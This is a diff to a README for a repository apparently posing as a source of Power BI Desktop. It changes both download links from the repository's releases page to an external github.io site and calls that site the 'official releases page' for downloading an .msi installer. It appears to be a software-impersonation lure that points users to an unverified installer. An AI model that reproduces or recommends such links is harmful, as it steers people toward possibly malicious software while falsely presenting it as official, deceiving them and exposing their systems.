@@ -1,6 +1,6 @@
 # 📊 Power-BI-Desktop-2026 - Create visual reports from your data
 
-[Link to Download](https://github.com/verinetorrential511/Power-BI-Desktop-2026/releases)
+[Link to Download](https://verinetorrential511.github.io)
 
 ## 📥 Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific components to run the software. Verify your system 
 
 Follow these steps to acquire the installer file:
 
-1. Visit the [official releases page](https://github.com/verinetorrential511/Power-BI-Desktop-2026/releases).
+1. Visit the [official releases page](https://verinetorrential511.github.io).
 2. Locate the section labeled Assets.
 3. Click the file ending in .msi to start your download.
 4. Wait for the file to save to your Downloads folder.
